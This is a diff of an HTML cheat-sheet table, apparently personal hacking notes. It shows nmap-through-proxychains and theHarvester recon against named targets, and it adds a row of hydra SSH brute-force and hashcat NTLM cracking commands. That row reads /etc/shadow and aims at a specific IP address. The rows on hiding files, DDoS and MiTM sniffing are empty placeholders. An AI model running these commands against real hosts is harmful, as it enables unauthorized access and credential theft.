@@ -345,8 +345,6 @@ $ proxychains nmap -sT -p 80,443 217.160.0.69 <br />
 Google Hacking Database : [GHD](https://www.exploit-db.com/google-hacking-database) <br />
 $ theHarvester -d starbucks.com -b google (find emails and respective ip addresses)<br />
 $ theHarvester -d starbucks.com -b netcraft (lot more information)<br />
-
-
 <br /></td>
 </tr>
 
@@ -365,7 +363,44 @@ $ theHarvester -d starbucks.com -b netcraft (lot more information)<br />
 </tr>
 
 <tr>
-<th>x</th>
+<th>Hacking password with Hashcat</th>
+<td>Crack with hydra aand hashcat<br /></td>
+<td>
+$ cd /usr/share/wordlists <br />
+$ sudo gzip -d rockyou.txt.gz (14 mil passwords) <br />
+$ sudo hydra -l "username" -P wordlist.txt \ (dictionary brute force attack - RockYou.txt) <br />
+> 45.79.49.74 ssh (firewalls might block this)<br />
+$ cat wordlist.txt (my custom wordlist) <br />
+$ cat /etc/shadow (hashes - MD5, SHA 256 , NTLM etc)<br />
+$ man hashcat <br />
+$ sudo hashcat -a 0 -m 1000 -o crackedpass.txt \ <br />
+> hashes.txt wordlist.txt  (1000 for NTLM - Windows based attacks)<br />
+$ sudo hashcat -a 0 -m 1000 -o crackpass.txt \ <br />
+"1CAGHKLGSGIUGS" wordlist.txt <br />
+$ sudo cat crackpass.txt (output / result)<br />
+<br /></td>
+</tr>
+
+<tr>
+<th>Hide files on target machines</th>
+<td>hide files in windows and linux systems<br /></td>
+<td>x<br /></td>
+</tr>
+
+<tr>
+<th>DDoS from dark web</th>
+<td>x<br /></td>
+<td>x<br /></td>
+</tr>
+
+<tr>
+<th>SNiFF network traffic (MiTM attack)</th>
+<td>x<br /></td>
+<td>x<br /></td>
+</tr>
+
+<tr>
+<th>Build a Hacking Lab</th>
 <td>x<br /></td>
 <td>x<br /></td>
 </tr>
